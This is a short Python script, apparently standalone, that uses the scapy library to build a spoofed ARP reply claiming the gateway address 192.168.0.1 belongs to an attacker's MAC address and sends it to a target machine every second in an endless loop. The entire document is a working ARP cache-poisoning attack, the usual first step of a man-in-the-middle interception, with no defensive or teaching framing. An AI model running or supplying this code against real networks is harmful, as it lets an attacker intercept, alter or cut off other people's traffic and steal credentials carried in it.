import os
import time
from scapy.all import *

# Define the target IP and MAC addresses
target_ip = '192.168.0.10'
target_mac = '00:11:22:33:44:55'

# Define the attacker IP and MAC addresses
attacker_ip = '192.168.0.1'
attacker_mac = 'aa:bb:cc:dd:ee:ff'

# Create a spoofed ARP packet
arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=attacker_ip, hwsrc=attacker_mac)

# Continuously send the spoofed ARP packet every second
while True:
    send(arp_packet, verbose=False)
    time.sleep(1)
